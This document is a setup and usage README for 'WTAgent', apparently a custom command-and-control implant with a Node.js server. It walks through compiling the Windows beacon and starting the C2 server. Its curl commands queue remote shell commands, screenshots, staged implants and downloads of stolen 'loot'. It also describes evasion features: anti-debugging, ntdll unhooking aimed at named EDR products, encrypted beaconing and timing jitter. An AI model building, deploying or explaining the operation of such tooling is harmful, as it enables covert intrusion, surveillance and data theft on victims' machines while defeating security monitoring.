# WTAgent — Setup & Usage

## Architecture

```
[Operator browser] ──── WATCHTOWER UI (port 443)
                              │
[WTAgent beacon]  ────── wt_c2_server.js (port 8443) ──── loot/ stage/
                          Operator API (port 8444, localhost)
```

---

## 1. Generate TLS + RSA keys

```bash
cd WTAgent/

# TLS cert for HTTPS C2 server
openssl req -x509 -newkey rsa:2048 \
  -keyout server.key -out server.crt \
  -days 3650 -nodes \
  -subj "/CN=WTC2"

# RSA key pair for agent session key wrapping
openssl genrsa -out agent_unwrap.key 2048
openssl rsa -in agent_unwrap.key -pubout -out agent_unwrap_pub.pem
```

---

## 2. Configure WTAgent.cs

Edit `src/WTAgent.cs` — `Config` class:

| Field | Description |
|-------|-------------|
| `C2_URL` | Your server IP/hostname + C2 port, e.g. `https://192.168.101.7:8443` |
| `SERVER_PUBKEY` | Base64 body of `agent_unwrap_pub.pem` (remove `-----BEGIN/END PUBLIC KEY-----` and newlines) |
| `SLEEP_BASE` / `SLEEP_JITTER` | Check-in interval in ms (default 5s ± 2s) |

---

## 3. Compile the beacon

```
compile.bat
```

Output: `bin/WTAgent.exe`

Requires .NET 4.5+ (ships with Windows 7+). For cross-compilation on Linux, use Mono:
```bash
mcs -target:exe -platform:x86_64 -optimize+ \
    -r:System.Windows.Forms.dll -r:System.Drawing.dll \
    -out:bin/WTAgent.exe src/WTAgent.cs
```

---

## 4. Start the C2 server

```bash
node wt_c2_server.js --port 8443 --key server.key --cert server.crt
```

Logs written to `wt_c2.log`.

---

## 5. Operator API (curl examples)

```bash
BASE=http://127.0.0.1:8444

# List agents
curl $BASE/op/agents

# Queue a shell command
curl -X POST $BASE/op/task/AGENTID \
     -H 'Content-Type: application/json' \
     -d '{"type":"shell","arg":"whoami /all"}'

# Queue a screenshot
curl -X POST $BASE/op/task/AGENTID \
     -d '{"type":"screenshot"}'

# Get results
curl $BASE/op/results/AGENTID

# Queue process list
curl -X POST $BASE/op/task/AGENTID -d '{"type":"proclist"}'

# Stage a file for agent download (agent uses type:"download",arg:"filename.exe")
curl -X POST $BASE/op/stage/implant.exe --data-binary @implant.exe

# List exfil'd files
curl $BASE/op/loot

# Download exfil'd file
curl $BASE/op/loot/AGENTID_timestamp_file.jpg -o out.jpg

# Change agent sleep interval (ms)
curl -X POST $BASE/op/task/AGENTID -d '{"type":"sleep","sleep":10000}'

# Kill agent (exit process)
curl -X POST $BASE/op/task/AGENTID -d '{"type":"kill"}'

# Self-delete agent exe
curl -X POST $BASE/op/task/AGENTID -d '{"type":"selfdel"}'
```

---

## 6. Kill switch

Set the following registry value to immediately stop the agent on next check-in:

```
HKCU\Software\WTAgent\kill  (any type/value)
```

PowerShell:
```powershell
New-ItemProperty -Path "HKCU:\Software\WTAgent" -Name "kill" -Value 1 -Force
```

---

## Security Features

### Anti-Debug
Checked on startup and periodically during the beacon loop:
- `IsDebuggerPresent()` — kernel32 flag
- `CheckRemoteDebuggerPresent()` — remote debugger attach detection
- `NtQueryInformationProcess(ProcessDebugPort)` — checks debug port
- `NtQueryInformationProcess(ProcessDebugFlags)` — checks NoDebugInherit flag
- **Timing check** — measures NOP loop duration; single-stepping inflates it above threshold

On detection: long sleep (not exit) to avoid "process died on debugger attach" tell.

### Unhooking
On startup, overwrites the in-memory `.text` section of `ntdll.dll` with a clean copy read
directly from `C:\Windows\System32\ntdll.dll`. This removes user-mode hooks placed by
AV/EDR products (e.g. CrowdStrike, SentinelOne, Carbon Black) that intercept syscalls
by patching `Nt*` function prologues.

### Encrypted Comms
- **Session key**: 32-byte AES key + 32-byte HMAC key, generated fresh per agent run
- **Key exchange**: session keys wrapped with server RSA-2048 public key (OAEP/SHA-256)
  and sent once during registration
- **Payload format**: `IV(16) || AES-256-CBC(plaintext) || HMAC-SHA256(IV+ciphertext)`
- **TLS transport**: HTTPS with self-signed cert (agent accepts any cert to handle lab certs)

### Sleep Jitter
Check-in interval = `SLEEP_BASE ± SLEEP_JITTER` (uniform random), configurable at runtime
via `sleep` task type. Avoids regular beacon timing signatures.
